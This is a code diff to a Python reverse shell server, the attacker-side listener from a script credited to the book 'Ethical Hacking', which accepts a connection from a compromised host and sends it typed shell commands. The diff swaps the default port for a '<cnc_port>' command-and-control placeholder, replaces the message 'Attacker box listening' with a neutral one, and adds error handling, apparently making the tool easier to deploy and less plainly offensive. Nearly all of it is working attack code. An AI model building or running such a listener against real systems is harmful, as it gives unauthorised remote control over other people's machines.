@@ -7,7 +7,7 @@ Reverse Shell script (server) as laid out in the book "Ethical Hacking". Made so
 """
 import sys
 from socket import *
-serverPort = sys.argv[1] if len(sys.argv) > 1 else 8000 # Use port 8000 by default
+serverPort = sys.argv[1] if len(sys.argv) > 1 else int('<cnc_port>') # Use port 8000 by default
 
 # Create client IPv4 (AF_INET) TCPSocket (SOCK_STREAM)
 # Using IPv4 TCP Socket to match client socket
@@ -22,7 +22,7 @@ serverSocket.bind(('', serverPort))
 # Listen for incoming connections
 serverSocket.listen(1)
 
-print("Attacker box listening and awaiting instructions")
+print("Awaiting connections... (enter 'exit' to disconnect)")
 
 # Create/Return socket obj after socket conn
 connectionSocket, addr = serverSocket.accept()
@@ -37,8 +37,11 @@ command = ""
 while command != "exit":
     command = input("Enter a command: ")
     connectionSocket.send(command.encode())
-    message = connectionSocket.recv(1024).decode()
-    print(message)
+    try:
+        message = connectionSocket.recv(1024).decode()
+        print(message)
+    except:
+        print("Could not get command output.")
 
 connectionSocket.shutdown(SHUT_RDWR)
 connectionSocket.close()
